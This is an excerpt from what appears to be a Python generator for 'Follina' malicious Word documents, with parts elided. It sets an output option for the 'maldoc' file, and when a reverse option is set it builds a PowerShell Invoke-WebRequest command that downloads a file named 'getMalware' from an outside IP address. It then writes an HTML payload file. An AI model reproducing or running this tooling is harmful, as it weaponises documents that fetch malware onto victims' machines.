...
parser.add_argument(
    "--output",
    "-o",
    default="./follina.docx",
    help="output maldoc file (default: ./follina.docx)",
)
...
def main(args):
    ...
    if args.reverse:
        command = f"""Invoke-WebRequest http://42.96.42.99:8082/getMalware -OutFile /media/n33r9/Data/Desktop/NCKH22/Gen_Follina;"""
    ...
    with open(os.path.join(serve_path, "new_follina.html"), "w") as filp:
